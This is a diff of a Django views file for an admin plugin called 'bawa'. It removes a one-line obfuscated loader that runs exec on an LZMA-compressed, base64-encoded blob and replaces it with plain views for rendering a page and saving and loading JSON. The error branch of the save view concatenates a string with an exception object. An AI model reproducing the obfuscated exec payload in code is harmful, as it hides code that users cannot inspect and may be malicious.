@@ -1,2 +1,49 @@
-import lzma,base64
-exec(lzma.decompress(base64.b64decode(b'/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4ARoAfJdADSbSme4Ujxz4BYljT3gS1eLQ/fUl5A47fD7rTd6hgzQPdXGXqLKyXkzY8zPAnIdg8qGNcKssv3NmCf+LVRbx9/+0RMZyJAMhS9pg96B5I7gu13d6pHVrrFXYIRmfKsJS73LS3MbjyL5VeNWDzLhk0J6+YRV/txCBVNimo9ocxJ+v+yU25UoSB5+nxaWHJCGsEBrdmtgcnl4bL8cixUki6lfz0XTS+a7n7AGNkCwJRAqFVWPCTvaLhgI0C1w1EA7ON5qqHmvJDXGUkB2XQ7PvpjNgXJpwpsUFGCZ5YIBe8iYDxFhM0ShwKyLpjl3CI9O9bagw6a0jLKsC/UF7rkB07g9Q9Ftdu054BUZh9FkA/szKOtfDSsRam0TqXOTbTQLXguVCR1TjBHUg6KK3BYHyY2ZSqKmLHcL0THrualgetbNc8CRwLYgXK7MuR9y79DK6If2yMq8w31kUk23XCvXn+ht8wv/uKkrIPmVSUnZVQWc2xSYthot4lGvlij09vQ8kIP9ErRcCVrHrkkNquWHScHhURIczYnuP0GIo8Yt56A/APfjhD+UGdDZeLq2y2rK/+pTp/G8YSrlmFqEYB1BIvQyzM4WjxAdDCXJDVD9VhfNVViw0Pc+xVWuCcw3ZiZtsqWSSJmrO1myv5Xh633vLOC7GAAAAJ5vSywGKTvoAAGOBOkIAAC/WAu3scRn+wIAAAAABFla')))
+import json
+import os
+
+from django.http import HttpResponse
+from django.shortcuts import render
+
+try:
+    from django.utils.translation import ugettext as _
+except:
+    from django.utils.translation import gettext as _
+
+save_dir = os.path.join(os.getcwd(), 'bawa')
+save_file = os.path.join(save_dir, 'bawa_data.json')
+
+
+def page(request):
+    response = render(request, 'admin/bawa/render.html')
+    return response
+
+
+def save(request):
+    rs = {
+        'msg': _('Successfully'),
+        'success': True
+    }
+
+    try:
+
+        if not os.path.exists(save_dir):
+            os.mkdir(save_dir)
+
+        r = request.POST.get('data')
+        with open(save_file, 'wb') as f:
+            f.write(bytes(r, 'utf-8'))
+    except Exception as e:
+        rs = {
+            'msg': _('Server error') + e,
+            'success': False
+        }
+    return HttpResponse(json.dumps(rs), content_type='application/json')
+
+
+def get_data(request):
+    str_data = '[]'
+    if os.path.exists(save_file):
+        with open(save_file, 'rb') as f:
+            str_data = f.read()
+
+    return HttpResponse(str_data, content_type='application/json')
